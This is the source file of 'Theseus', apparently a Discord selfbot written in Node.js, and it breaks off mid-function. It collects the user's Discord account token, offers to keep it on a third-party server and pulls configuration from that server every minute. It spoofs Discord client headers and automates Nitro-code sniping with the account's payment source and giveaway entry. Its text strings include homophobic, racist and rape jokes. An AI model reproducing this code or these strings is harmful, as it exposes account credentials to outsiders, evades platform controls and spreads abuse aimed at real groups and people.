console.clear();
l('');
l('████████████████████████████████████████████████████████')
l('█                                                      █')
l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
l('█                                                      █')
l('████████████████████████████████████████████████████████')
l('')
console.log('Please make sure you run install-windows.bat or install-linux.sh before starting the bot!');
const fs = require('fs');
const path = require('path');
var Envdata = process.env.APPDATA || (process.platform == 'darwin' ? process.env.HOME + '/Library/Preferences' : process.env.HOME + "/.local/share");
const Discord = require('discord.js');
const { RichEmbed } = require('discord.js');
const bot = new Discord.Client();
var colors = require('colors');

var nonDynamics = {
    embed: {
        method: "EMBED",
        author: {
            text: "Lol",
            icon: "",
            url: ""
        },
        footer: {
            text: "You smell like you far-",
            icon: ""
        }
    }
}

if(!fs.existsSync(path.join(Envdata, ".theseus"))) {
    fs.mkdirSync(path.join(Envdata, ".theseus"))
    fs.mkdirSync(path.join(Envdata, ".theseus", "commands"))
    fs.writeFileSync(path.join(Envdata, ".theseus", "commands", "example.js"), `
module.exports = {
    name: 'example', // command listener
    description: 'i am an example command, i will say hello', // shown when you index this in help menu
    usage: 'example',
    type: 0, // NSFW, FUN, UTIL, INFO are types
    arguments: false, // doesnt have arguments
    execute(msg, args, bot) {
        msg.channel.send("hello!")
    }
}`)
    fs.mkdirSync(path.join(Envdata, ".theseus", "plugins"))

}

const fetch = require('node-fetch');
const lang = {
    "splashes": [
        "As seen on TV!",
        "Awesome!",
        "100% pure!",
        "May contain nuts!",
        "Better than Prey!",
        "More polygons!",
        "Sexy!",
        "Limited edition!",
        "Flashing letters!",
        "Made by Koda!",
        "It's here!",
        "Best in class!",
        "It's finished!",
        "Kind of dragon free!",
        "Excitement!",
        "More than 500 sold!",
        "One of a kind!",
        "Heaps of hits on YouTube!",
        "Indev!",
        "Spiders everywhere!",
        "Check it out!",
        "Holy cow, man!",
        "It's a game!",
        "Made in Sweden!",
        "Uses LWJGL!",
        "Reticulating splines!",
        "Minecraft!",
        "Yaaay!",
        "Singleplayer!",
        "Keyboard compatible!",
        "Undocumented!",
        "Ingots!",
        "Exploding creepers!",
        "That's no moon!",
        "l33t!",
        "Create!",
        "Survive!",
        "Dungeon!",
        "Exclusive!",
        "The bee's knees!",
        "Down with O.P.P.!",
        "Closed source!",
        "Classy!",
        "Wow!",
        "Not on steam!",
        "Oh man!",
        "Awesome community!",
        "Pixels!",
        "Teetsuuuuoooo!",
        "Kaaneeeedaaaa!",
        "Now with difficulty!",
        "Enhanced!",
        "90% bug free!",
        "Pretty!",
        "12 herbs and spices!",
        "Fat free!",
        "Absolutely no memes!",
        "Free dental!",
        "Ask your doctor!",
        "Minors welcome!",
        "Cloud computing!",
        "Legal in Finland!",
        "Hard to label!",
        "Technically good!",
        "Bringing home the bacon!",
        "Indie!",
        "GOTY!",
        "Ceci n'est pas une title screen!",
        "Euclidian!",
        "Now in 3D!",
        "Inspirational!",
        "Herregud!",
        "Complex cellular automata!",
        "Yes, sir!",
        "Played by cowboys!",
        "OpenGL 1.2!",
        "Thousands of colors!",
        "Try it!",
        "Age of Wonders is better!",
        "Try the mushroom stew!",
        "Sensational!",
        "Hot tamale, hot hot tamale!",
        "Play him off, keyboard cat!",
        "Guaranteed!",
        "Macroscopic!",
        "Bring it on!",
        "Random splash!",
        "Call your mother!",
        "Monster infighting!",
        "Loved by millions!",
        "Ultimate edition!",
        "Freaky!",
        "You've got a brand new key!",
        "Water proof!",
        "Uninflammable!",
        "Whoa, dude!",
        "All inclusive!",
        "Tell your friends!",
        "NP is not in P!",
        "Koda <3 ez!",
        "Music by C418!",
        "Livestreamed!",
        "Haunted!",
        "Polynomial!",
        "Terrestrial!",
        "All is full of love!",
        "Full of stars!",
        "Scientific!",
        "Cooler than Spock!",
        "Collaborate and listen!",
        "Never dig down!",
        "Take frequent breaks!",
        "Not linear!",
        "Han shot first!",
        "Nice to meet you!",
        "Buckets of lava!",
        "Ride the pig!",
        "Larger than Earth!",
        "sqrt(-1) love you!",
        "Phobos anomaly!",
        "Punching wood!",
        "Falling off cliffs!",
        "0% sugar!",
        "150% hyperbole!",
        "Synecdoche!",
        "Let's danec!",
        "Seecret Friday update!",
        "Reference implementation!",
        "Lewd with two dudes with food!",
        "Kiss the sky!",
        "20 GOTO 10!",
        "Verlet intregration!",
        "Peter Griffin!",
        "do not distribute!",
        "Cogito ergo sum!",
        "4815162342 lines of code!",
        "A skeleton popped out!",
        "The Work of Koda!",
        "The sum of its parts!",
        "BTAF used to be good!",
        "I miss ADOM!",
        "umop-apisdn!",
        "OICU812!",
        "Bring me Ray Cokes!",
        "Finger-licking!",
        "Thematic!",
        "Pneumatic!",
        "Sublime!",
        "Octagonal!",
        "Une baguette!",
        "Gargamel plays it!",
        "Rita is the new top dog!",
        "SWM forever!",
        "Representing Edsbyn!",
        "Matt Damon!",
        "Supercalifragilisticexpialidocious!",
        "Consummate V's!",
        "Cow Tools!",
        "Double buffered!",
        "Fan fiction!",
        "Flaxkikare!",
        "Jason! Jason! Jason!",
        "Hotter than the sun!",
        "Internet enabled!",
        "Autonomous!",
        "Engage!",
        "Fantasy!",
        "DRR! DRR! DRR!",
        "Kick it root down!",
        "Regional resources!",
        "Woo, facepunch!",
        "Woo, somethingawful!",
        "Woo, /v/!",
        "Woo, tigsource!",
        "Woo, minecraftforum!",
        "Woo, worldofminecraft!",
        "Woo, reddit!",
        "Woo, 2pp!",
        "Google anlyticsed!",
        "Now supports åäö!",
        "Give us Gordon!",
        "Tip your waiter!",
        "Very fun!",
        "12345 is a bad password!",
        "Vote for net neutrality!",
        "Lives in a pineapple under the sea!",
        "MAP11 has two names!",
        "Omnipotent!",
        "Gasp!",
        "...!",
        "Bees, bees, bees, bees!",
        "Jag känner en bot!",
        "This text is hard to read if you play the game at the default resolution, but at 1080p it's fine!",
        "Haha, LOL!",
        "Hampsterdance!",
        "Switches and ores!",
        "Menger sponge!",
        "idspispopd!",
        "Eple (original edit)!",
        "So fresh, so clean!",
        "Slow acting portals!",
        "Try the Nether!",
        "Don't look directly at the bugs!",
        "Oh, ok, Pigmen!",
        "Finally with ladders!",
        "Scary!",
        "Play Minecraft, Watch Topgear, Get Pig!",
        "Twittered about!",
        "Jump up, jump up, and get down!",
        "Joel is neat!",
        "A riddle, wrapped in a mystery!",
        "Huge tracts of land!",
        "Welcome to your Doom!",
        "Stay a while, stay forever!",
        "Stay a while and listen!",
        "Treatment for your rash!",
        "Autological is!",
        "Information wants to be free!",
        "Almost never is an interesting concept!",
        "Lots of truthiness!",
        "The creeper is a spy!",
        "Turing complete!",
        "It's groundbreaking!",
        "Let our battle's begin!",
        "The sky is the limit!",
        "Meme has amazing hair!",
        "Casual gaming!",
        "Undefeated!",
        "Kinda like Lemmings!",
        "Follow the train, CJ!",
        "Leveraging synergy!",
        "This message will never appear on the splash screen, isn't that weird?",
        "DungeonQuest is unfair!",
        "110813!",
        "90210!",
        "Check out the far lands!",
        "Tyrion would love it!",
        "Also try VVVVVV!",
        "Also try Super Meat Boy!",
        "Also try Terraria!",
        "Also try Mount And Blade!",
        "Also try Project Zomboid!",
        "Also try World of Goo!",
        "Also try Limbo!",
        "Also try Pixeljunk Shooter!",
        "Also try Braid!",
        "That's super!",
        "Bread is pain!",
        "Read more books!",
        "Khaaaaaaaaan!",
        "Less addictive than TV Tropes!",
        "More addictive than lemonade!",
        "Bigger than a bread box!",
        "Millions of peaches!",
        "Fnord!",
        "This is my true form!",
        "Totally forgot about Dre!",
        "Don't bother with the clones!",
        "Pumpkinhead!",
        "Hobo humping slobo babe!",
        "Made by Meme!",
        "Has an ending!",
        "Finally complete!",
        "Feature packed!",
        "Boots with the fur!",
        "Stop, hammertime!",
        "Testificates!",
        "Conventional!",
        "Homeomorphic to a 3-sphere!",
        "Doesn't avoid double negatives!",
        "Place ALL the blocks!",
        "Does barrel rolls!",
        "Meeting expectations!",
        "PC gaming since 1873!",
        "Ghoughpteighbteau tchoghs!",
        "Déjà vu!",
        "Déjà vu!",
        "Got your nose!",
        "Haley loves Elan!",
        "Afraid of the big, black bat!",
        "Doesn't use the U-word!",
        "Child's play!",
        "See you next Friday or so!",
        "From the streets of Södermalm!",
        "150 bpm for 400000 minutes!",
        "Technologic!",
        "Funk soul brother!",
        "Pumpa kungen!",
        "日本ハロー！",
        "한국 안녕하세요!",
        "Helo Cymru!",
        "Cześć Polska!",
        "你好中国!",
        "Привет Россия!",
        "Γεια σου ελλάδα!",
        "My life for Aiur!",
        "Lennart lennart = new Lennart();",
        "I see your vocabulary has improved!",
        "Who put it there?",
        "You can't explain that!",
        "if not ok then return end",
        "Colormatic",
        "FUNKY LOL",
        "SOPA means LOSER in Swedish"
    ],
    "VERSION_MISMATCH":"Config <-> Instance version mismatch",
    "isGayResponses": {
        "yes": [
            "Is Gay! :kiss_mm:",
            "Like's Men :rainbow_flag:",
            "Is Gay, Make Fun Of Them",
            "Has Homosexual Thoughts",
            "Is As Straight As George Floyd's Criminal Record :boy_tone5:"
        ],
        "no": [
            "Is As Straight As A Ruler :straight_ruler:",
            "Is Straighter Than Their Mom's Stripper Pole",
            "Only Likes Traps",
            "Is Straighter Then Their Dad's Dick",
            "Was Not Raped By Their Dad And Now Doesn't Hate Men"
        ]
    }, 
    "nitroSniper": {
        "prefix": "NITRO SNIPER",
        "getting_paymentsourceid": "Attempting to get payment source id to use more nitro codes...",
        "got_paymentsourceid": "Successfully set payment source id!",
        "no_paymentsourceid": "You do not have any payment methods on your account, some codes will not be redeemable.",
        "http_request_failed": "HTTP ERR 403: Typically occurs if you are not using an email verified account token.",
        "invalid_token": "Discord's API did not accept the token in your config, please stop the bot and edit the config.",
        "gift_info": "{{code}} in {{location}} from {{author}}",
        "already_redeemed": "was already used!",
        "invalid_code": "was not a valid code",
        "success": "was successfully sniped!"
    },
    "activity": {
        "success": "Your activity has been successfully changed.",
        "invalid_usage": "Invalid command usage!",
        "usage": ".activity <type> <activity-string>"
    },
    "whois": {
        "header": "Results of IP address: {{ip}}",
        "country": "Country",
        "location": "Location",
        "isp": "Internet Provider",
        "org": "Organization (or provider) Name",
        "timezone": "Timezone"
    },
    "giveaways":{
        "prefix": "AUTO-GIVEAWAY",
        "enter_giveaway": "You have been entered into a giveaway in {{location}}",
        "won_giveaway": {
            "hostDm": "You won a giveaway in {{location}} hosted by {{host}} and sent them a DM",
            "noHostDm": "You won a giveaway in {{location}} hosted by {{host}}"
        },
        "nobodywins_giveaway": "There was a giveaway that nobody won in {{location}}",
        "lost_giveaway": "You lost a giveaway in {{location}} hosted by {{host}}"
    },
    "8ball": [
        "Who cares lol", 
        "I mean sure, go ahead", 
        "OH MY GOD YES!!!", 
        "no fugg off lol idiot", 
        "Don't count on it, bro", 
        "ask again idiot", 
        "probably lmao", 
        "i dont think so lolll", 
        "nah bro", 
        "of course not loser", 
        "I think so?", 
        "Uh.. yeah?", 
        "no lol", 
        "it's a yes from me", 
        "outlook.. ehhh?", 
        "to be honest not really", 
        "OH MY GOD FUCK NO!!!", 
        "ayo you suck bro, of course not", 
        "yes????", 
        "im busy doing your mom"
    ],
    "bussin": "bussin'"
};
const ping = require('ping');
var authentication = {};
if(fs.existsSync(path.join(Envdata, ".theseus", "auth.json"))) {
    authentication = JSON.parse(fs.readFileSync(path.join(Envdata, ".theseus", "auth.json"), {encoding:'utf8', flag:'r'}));
}
else {
    if(fs.existsSync(path.join(Envdata, ".theseus", "OOBE"))) {
        fs.rmSync(path.join(Envdata, ".theseus", "OOBE"));
    }
}
const axios = require('axios');
const readline = require('readline');
const chalk = require('chalk');
console.log(chalk.greenBright('Modules found! ') + "Bot can now start.");
var term = require( 'terminal-kit' ).terminal ;
const { exit, env } = require('process');
var config = [];
bot.config = [];
var cancellasttokenfuck = false;
var funnyc = "dark";
var funnyl = "en-US";
var currentsplash = "";

//fs.writeFile("funny.txt", JSON.stringify(file), function writeJSON(err) {
//    if (err) return System.text(err);
//    System.text(JSON.stringify(file));
//    System.text('writing to ' + "funny.txt");
//  });


process.stdout.write( String.fromCharCode(27) + "]0;" + "Theseus Bot" + String.fromCharCode(7) );                        
const remote = {
    ENDPOINT: "https://theseus.me/",
    VERSION: "api/v2/",
    ACTION: "tunnels/login"
};

var System = {
    text(input) {
        if(!config.console) {
            colorsel = "white";
        }
        else {
            if(chalk[config.console.color]) {
                colorsel = config.console.color;
            }
            else {
                colorsel = "white";
            }
        }

        return console.log(chalk[colorsel](input));
    },
    watermark(input) {
        if(!config.watermark.color) {
            colorsel = "white";
        }
        else {
            if(chalk[config.watermark.color]) {
                colorsel = config.watermark.color;
            }
            else {
                colorsel = "white";
            }
        }

        return console.log(chalk[colorsel](input));
    },
    line(input) {
        if(!config.console.hrColor) {
            colorsel = "white";
        }
        else {
            if(chalk[config.console.hrColor]) {
                colorsel = config.console.hrColor;
            }
            else {
                colorsel = "white";
            }
        }

        return console.log(chalk[colorsel](input));
    }
}

bot.embedColors = (c) => {
    if(config.embedColors) {
        switch (c) {
            case "danger":
                return config.embedColors.danger;
            case "success":
                return config.embedColors.success;
            case "info":
                return config.embedColors.info;
            default:
                return c;
        }
    }
}

let theseus_fetch = async (url) => {
    let response = await axios.get(url);
    let data = response.data;
    return data;
}

let theseus_request = async (url, input={}) => {
    let response = await axios.post(url, input, {headers: {
        "Authorization": config.token,
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA1NjA4LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    }});
    let data = response.data;
    return data;
}

let request_auth = async (url, input) => {
    let response = await axios.post(url, input);
    let data = response.data;
    return data;
}

function step1() {
    console.clear();
    l('');
    l('████████████████████████████████████████████████████████')
    l('█                                                      █')
    l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
    l('█                                                      █')
    l('████████████████████████████████████████████████████████')
    l('')
    term(` Welcome! It's time to setup your Theseus. `) ;
    term(` Please authenticate with your username and password\n\n`) ;
    term(` Username: `) ;

    var username = term.inputField(
        {} ,
        async function( error , input1 ) {
            fs.writeFileSync(path.join(Envdata, ".theseus", "precache"), JSON.stringify({}));
            term(`\n Password: `) ;
            var password = term.inputField(
                {echoChar: "*"} ,
                async function( error , input2 ) {
                    username.abort();
                    password.abort();
                    for (let i = 0; i < 10; i++) {
                        fs.writeFileSync(path.join(Envdata, ".theseus", "tccblob"+i), JSON.stringify({}));                            
                    }
                    console.log("\n\n Please wait...");
                    request_auth("https://theseus.me/api/v2/tunnels/getkey", { username: input1, password: input2 })
                    .then(result => {step2(input1, result["access_key"])})
                    .catch(async ex => { console.log(chalk.redBright(`\n ${ex.response.data.error.message} (${ex.response.data.error.code})`)); await delay(5000); step1()})
                }
            );
        }
    ) ;            
}
function step2(user, acky) {
    for (let i = 0; i < 10; i++) {
        fs.rmSync(path.join(Envdata, ".theseus", "tccblob"+i));                            
    }
    fs.writeFileSync(path.join(Envdata, ".theseus", "auth.json"), JSON.stringify({"accountUsername": user.toLowerCase(), "accountSecret": acky}))
    authentication = JSON.parse(fs.readFileSync(path.join(Envdata, ".theseus", "auth.json"), {encoding:'utf8', flag:'r'}));
    console.clear();
    l('');
    l('████████████████████████████████████████████████████████')
    l('█                                                      █')
    l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
    l('█                                                      █')
    l('████████████████████████████████████████████████████████')
    l('')
    term(` Welcome back, ${user}! We were able to log you in.\n`)
    term(` Now we require your Discord Auth Token, this will \n`)
    term(` allow the bot to login and work from your account\n\n`)
    term(` We have 2 ways for you to do this. You can have it stored on our secure & encrypted\n data servers in your configuration or you can have it\n stored locally in the safety of your own computer.`)
    console.log('')
    var items = [
        'Server stored' ,
        'Locally stored'
    ];
    term.singleColumnMenu( items , function( error , response ) {
        if(response.selectedIndex == 0) {
            console.clear();
            l('');
            l('████████████████████████████████████████████████████████')
            l('█                                                      █')
            l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
            l('█                                                      █')
            l('████████████████████████████████████████████████████████')
            console.log('')
            console.log(' External Steps Required: Please visit https://theseus.me/conf and enter your token\n into the Discord Token field then continue.')
            console.log('')
            console.log(" Your authentication token is now selected to be stored on our servers!\n If you ever want this to change, create a file named dsgd.key in your bot folder\n and store your token in it, it will automatically be detected.");
            term.singleLineMenu( [" After you're done, press ENTER and the bot will start."], {style: term.green, selectedStyle: term.bgBlack.green, separator: "     "}, function( error , response ) {
                fs.writeFileSync(path.join(Envdata, ".theseus", "OOBE"), "");
                fs.rmSync(path.join(Envdata, ".theseus", "precache"));                            
                botStart();
            });
        }
        
        if(response.selectedIndex == 1) {
            console.clear();
            l('');
            l('████████████████████████████████████████████████████████')
            l('█                                                      █')
            l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
            l('█                                                      █')
            l('████████████████████████████████████████████████████████')
            console.log('')
            console.log(' You selected to use local storage!')
            console.log(' Please enter your Discord Auth Token below')
            console.log(' ')
            console.log(' If you need help, please watch this: https://www.youtube.com/watch?v=LnBnm_tZlyU')
            term("\n\n Token: ")
            var token = term.inputField(
                {} ,
                async function( error , tokenf ) {
                    fs.writeFileSync(path.join(Envdata, ".theseus", "dsgd.key"), tokenf);
                    console.log("");
                    console.log(" Your token has been stored in dsgd.key");
                    term.singleLineMenu( [" After you're done, press ENTER (or exit the bot) then restart it."], {style: term.green, selectedStyle: term.bgBlack.green, separator: "     "}, function( error , response ) {
                        fs.writeFileSync(path.join(Envdata, ".theseus", "OOBE"), "");
                        fs.rmSync(path.join(Envdata, ".theseus", "precache"));                            
                        botStart();
                    });
                })
        }
    })
}
function step3() {

}

var authenticateBot = async () => {
    

      var tasklist = [
        "Step 1 | Connect",
        "Step 2 | Authenticate",
        "Step 3 | Fetch: USER",
        "Step 3 | Fetch: CONFIG",
        "Step 4 | Success! Cleaning up",
        "Step 5 | Login: Token"

    ]

    console.clear();
    l('');
    l('████████████████████████████████████████████████████████')
    l('█                                                      █')
    l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
    l('█                                                      █')
    l('████████████████████████████████████████████████████████')
    l('')
    progressBar = term.progressBar( {
        title: 'Theseus.me is loading' ,
        eta: false ,
        percent: true ,
        items: tasklist.length,
        barChar: "█",
        barHeadChar: "▒"
    } ) ;
    
    var selItem = tasklist.shift();
    progressBar.startItem(selItem);
      await delay(1000);
      progressBar.itemDone(selItem);
    
  
    var selItem = tasklist.shift();
    progressBar.startItem(selItem);
    let checkSecret = async () => {
        var options = {headers: {'Content-Type': 'application/x-theseus.me+json'}};
        let data;
        await axios.post(`https://theseus.me/api/v2/tunnels/login`, JSON.stringify({username: authentication.accountUsername, key: authentication.accountSecret}), options)
        .then(response => {
            data = response;
        })
        .catch(async (ex) => {
            data = null;
            progressBar.stop();
            l("There was an error whilst authenticating with Theseus... \nYou are being redirected to the OOBE setup to reauthenticate.");
            console.log(ex);
            await delay(50000);
            step1();
        });
//        let response = {data: {result: "error", message: "SYSTEM_UPDATE_NEEDED"}}
        progressBar.itemDone(selItem);
        return data;
    }
    await checkSecret().then(async con => {
        if(con == null) {return;}
        if(!con.data.config) {
            throw new Error("You must create a configuration for the bot to follow at https://theseus.me/myaccount/download")
        }
        config = con.data.config; bot.config = con.data.config; user = con.data.user;
        if(fs.existsSync(path.join(Envdata, ".theseus", "dsgd.key"))) {
            config["token"] = fs.readFileSync(path.join(Envdata, ".theseus", "dsgd.key"), {encoding:'utf8', flag:'r'})
        }
        setInterval(() => {
            let getNewConfig = async () => {
                var options = {headers: {'Content-Type': 'application/x-theseus.me+json'}};
                let response = await axios.post(`https://theseus.me/api/v2/tunnels/configuration`, JSON.stringify({username: authentication.accountUsername, key: authentication.accountSecret}), options).catch();
        //        let response = {data: {result: "error", message: "SYSTEM_UPDATE_NEEDED"}}
                let data = response.data;
                return response;
            }
            getNewConfig().then(newC => {
                if(fs.existsSync(path.join(Envdata, ".theseus", "dsgd.key"))) {
                    newC.data.token = fs.readFileSync(path.join(Envdata, ".theseus", "dsgd.key"), {encoding:'utf8', flag:'r'});
                    config["token"] = fs.readFileSync(path.join(Envdata, ".theseus", "dsgd.key"), {encoding:'utf8', flag:'r'})
                }
        
                if(JSON.stringify(newC.data) != JSON.stringify(config)) {
                    System.text("CONFIGURATION CHANGES DETECTED, UPDATING CONFIGURATION".bgCyan.black);
                    config = newC.data;
                    bot.config = config;
                    System.text("SUCCESSFULLY UPDATED CONFIGURATION TO MATCH INTEGRITY");
                } 
            })
        }, 60000)
    
        
        var selItem = tasklist.shift();
        progressBar.startItem(selItem);
        var selItem2 = tasklist.shift();
        progressBar.startItem(selItem2);
        
        await delay(500);
        progressBar.itemDone(selItem);
        await delay(1000);
        progressBar.itemDone(selItem2);
        
        try {
            currentsplash = lang.splashes[randmax(lang.splashes.length)];
        }
        catch (ex) {
            currentsplash = "Theseus V2";            
        }
        var selItem = tasklist.shift();
        progressBar.startItem(selItem);
        await delay(500);
        progressBar.itemDone(selItem);

        var selItem = tasklist.shift();
        progressBar.startItem(selItem);
        botNode(config, user, () => {progressBar.itemDone(selItem)});
        await delay(1000);
        progressBar.itemDone(selItem);
        console.clear();

    }).catch(err => {
        System.text(err);
//        System.text(`${err.response.data.error.http} -> ${err.response.data.error.message} (${err.response.data.error.code})`);
        exit(1);
    });

    // if(fetchAuth.result == "error") {
    //     if(fetchAuth.message.includes("AUTHORIZATION_BANNED")) {
    //         l(`Your account is currently banned from Theseus!`)
    //         l(`${fetchAuth.message}`)
    //         await delay(5000);
    //         throw new Error("AUTHORIZATION_BANNED");
    //     } else if (fetchAuth.message.includes("SYSTEM_UPDATE_NEEDED_EXTERNAL")) {
    //         l("Theseus is currently outdated, but this update can not be done automatically!")
    //         l("Visit https://theseus.me/user to update your bot.")
    //         await delay(5000);
    //         throw new Error("SYSTEM_UPDATE_NEEDED_EXTERNAL");
    //     } else if (fetchAuth.message.includes("SYSTEM_UPDATE_NEEDED_SELF")) {
    //         l("Theseus is currently outdated, self-updating in 5 seconds...")
    //         // async function doupdate () {  
    //         //     const url = 'https://theseus.me/api/v1/oreo/selfupdate'
    //         //     const curpath = path.resolve(__dirname, 'index.js')
    //         //     const writer = fs.createWriteStream(curpath)
              
    //         //     const response = await axios({
    //         //       url,
    //         //       method: 'GET',
    //         //       responseType: 'stream'
    //         //     })
              
    //         //     response.data.pipe(writer)
              
    //         //     return new Promise((resolve, reject) => {
    //         //       writer.on('finish', resolve)
    //         //       writer.on('error', reject)
    //         //     })
    //         // }
    //         await delay(5000);
    //         l("Theseus is now updating, do not close this window.")
    //         await doupdate()
    //         l("Successfully self-updated! You will need to restart Theseus for this to work, crashing self...")
    //         await delay(5000);
    //         throw new Error("SYSTEM_UPDATE_NEEDED -> SYSTEM_UPDATE_FINISHED");
    //     } else if (fetchAuth.message.includes("MISSING_AUTH_CREDS")) {
    //         l("You need to have a username and secret entered into ./auth.json")
    //         await delay(5000);
    //         throw new Error("MISSING_AUTH_CREDS");

    //     } else if (fetchAuth.message.includes("AUTHORIZATION_SECRET_INVALID")) {
    //         l("Your secret code is not valid, please recheck it and try again.")
    //         await delay(5000);
    //         throw new Error("AUTHORIZATION_SECRET_INVALID");

    //     } else if (fetchAuth.message.includes("AUTHORIZATION_USER_INVALID")) {
    //         l("The username you entered doesn't exist, please check it and try again.")
    //         await delay(5000);
    //         throw new Error("AUTHORIZATION_USER_INVALID");

    //     } else if (fetchAuth.message.includes("AUTHORIZATION_IPWHLST_MISMATCH")) {
    //         l("Your IP address does not correlate with your current whitelisted IP")
    //         l("Please whitelist this one on your account panel and try again.")
    //         await delay(5000);
    //         throw new Error("AUTHORIZATION_IPWHLST_MISMATCH");
    //     }
    //     else {
    //         l("Ran into an issue! Please contact admins to have this resolved.")
    //         await delay(5000);
    //         if(fetchAuth.error.message) {
    //             throw new Error(fetchAuth.error.message);
    //         }
    //         else {
    //             throw new Error("UNKNOWN_ERROR");
    //         }
    //     }
    // } else if (fetchAuth.result == "success"){
    //     _auth = true;
    //     l(`${fetchAuth.message}`)
    // } else {
    //     l("Ran into an issue! Please contact admins to have this resolved.".red)
    //     l(fetchAuth)
    //     await delay(5000);
    //     throw new Error("EMPTY_RESPONSE");

    //}
    

}

var no = "✗".red, yes = "✓".brightGreen;
var ver = "b1";
global.paymentSourceId = null;
var _auth = false;
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
 
bot.latestmsg = null;

function msToTime(ms) {
    let seconds = (ms / 1000).toFixed(1);
    let minutes = (ms / (1000 * 60)).toFixed(1);
    let hours = (ms / (1000 * 60 * 60)).toFixed(1);
    let days = (ms / (1000 * 60 * 60 * 24)).toFixed(1);
    if (seconds < 60) return seconds + " Sec";
    else if (minutes < 60) return minutes + " Min";
    else if (hours < 24) return hours + " Hrs";
    else return days + " Days"
  }
function hl(c=100){var x="";for(let i=0;i<c;i++){x=x+"▬"}return x[config.hl_color];}
function l(l){console.log(l);}
function u(u){if(bot.user.id==u){return true}else{return false}}
function randmax(x, p=true) {var r=Math.floor(Math.random() * x);if(p){r++}return r;}
function ok(m, e='✅'){m.react(e);}
function embed(title, description, fields) {
    if(nonDynamics.embed.method == "EMBED") {
        const embed = new RichEmbed()
        .setTitle(title)
        .setDescription(description)
        .setAuthor(nonDynamics.embed.author.text, nonDynamics.embed.author.icon, nonDynamics.embed.author.url)
        .setImage(nonDynamics.embed.image)
        .setFooter(nonDynamics.embed.footer.text)
        .setColor(nonDynamics.embed.color)
        .setThumbnail(nonDynamics.embed.thumbnail);
        if(nonDynamics.embed.showTimestamp == "true") embed.setTimestamp(Date.now());
    
        return embed;    
    }
}
function btoi(bool = false) {
    if(bool == true) {
        return ":white_check_mark:";
    }
    else {
        return ":x:";
    }
}
function axInit(config) {
    var x = "\u2500\u2500[ INIT DEBUG ]", v = process.stdout.columns;
    v = v - 16;
    for (let i = 0; i < v; i++) {
        x = x + "\u2500";
    }
    return x[config.console["hrColor"]];
}
function axMesa(str, amt, config) {
    var x = str, v = process.stdout.columns;
    v = v - amt;
    for (let i = 0; i < v; i++) {
        x = x + "\u2500";
    }
    return x[config.console["hrColor"]];
}

bot.commands = new Discord.Collection();
bot.plugins = new Discord.Collection();

function botNode(_config, user, func) {
    func();
    bot.on('ready', async () => {
        _auth = true;

        bot.on('message', async msg => {
            if(msg.author.id != bot.user.id) {
                if(config.autoRespond.enabled && msg.channel.type == "dm") {
                    switch (config.autoRespond.method) {
                        case "REPLY":
                            msg.channel.send(`<@${msg.author.id}>, ${config.autoRespond.message}`);
                            break;
                        case "SEND":
                            msg.channel.send(config.autoRespond.message)
                            break;
                    }
                }    
            }
            
            bot.latestmsg = msg;
            if(_auth != false){
    
            var _guildName, _channelName;
            try { 
                _guildName=msg.guild.name, _channelName=msg.channel.name, _msg=msg.content.replace(/\n/g, ", ");
            }
            catch (err){
                _guildName="group or friend",_channelName="none", _msg=msg.content.replace(/\n/g, ", ");
            }
            if(!_guildName){_guildName="group dm"}
            var m = msg;
            var mm = 'mentions';
            var _u = 'users';
            var top = 'first';
            var c = 'content';
            var gc = 'channel';
            var $ = 'send';
            var rr = 'reply';
            var sw = 'startsWith';
            var _ = m[c]['slice'](config.prefix.length).trim().split(/ +/g);
            var _j = "";
            var _num = _.length + 1;
            // for (let i=1; i<_.length; i++) {_j = _j+_[i]+" ";}
            // function cmd(name, arguments) {var _="";if(arguments){_=" "};return m[c][sw](`${config.prefix}${name}` + _)}
            // function completeHs(){if(config.handshakeResponse == "CHECK"){ok(msg)}else if(config.handshakeResponse == "DELETE"){msg.delete().catch()}else if(config.handshakeResponse == "CUSTOM"){ok(msg, config.handshakeCustomEmoji);}else{return null;}}
            // function send(message) {if(m.author.id != bot.user.id){msg.delete();}msg.channel.send(message)}
            // function checkDangerous() {if(config.allowDangerous == false){send(embed(config.embedColors.danger, `Halted last command!`, `The command **${msg.content}** is potentially dangerous and discord might detect something if executed!\n\nIf you would like to override this halt, please open config.json and change "allowDangerous" to true from false!`));return false;}else{return true;}}
            
    

            if(config.log.everything) {
                System.text(`${"CREATED MESSAGE".bgGreen.black} ${msg.author.tag} (${_guildName}->${_channelName}): ${_msg})`)
            }

            function _del(ms = 0){if(u(msg.author.id)){setTimeout(()=>{if(!msg.deleted){try{msg.delete()}catch(e){}}}, ms)}}
 
            if(config.autodel.enabled){
                if(msg.embeds.length > 0){
                    if(!msg.content.includes("http")){
                        _del(config.autodel.deleteAfterSeconds * 1000);
                    }
                }
                else {
                    if(config.autodel.deleteNonEmbed) {
                        _del(config.autodel.deleteAfterSeconds * 1000);
                    }
                }
            }
            var a=_;
            a.splice(0, 1);
            function checkuser() {
                if(msg.author.id == bot.user.id) {
                    if(config.log.passed) l(`${'COMMAND (SUCCESS)'.bgGreen.black} {{user}} - {{command}}`.replace(`{{user}}`, msg.author.tag).replace(`{{command}}`, msg.content.split(' ')[0]).replace(`{{%ifError}}`, ``));
                    return true;
                }
                else {
                    if(config.log.failed) l(`${'COMMAND (FAILURE)'.bgRed.black} {{user}} - {{command}} ({{%ifError}})`.replace(`{{user}}`, msg.author.tag).replace(`{{command}}`, msg.content.split(' ')[0]).replace(`{{%ifError}}`, `no access`));
                    return false;
                }
            }
            if(msg.content.startsWith(config.prefix) && bot.commands.find(val => `${config.prefix}${val.name}` === msg.content.split(' ')[0]) == null) {
                if(msg.author.id == bot.user.id) {
                    msg.channel.send(embed(config.embedColors.danger, "Unknown command", `Type \`${config.prefix}help\` to list commands and get command help`));
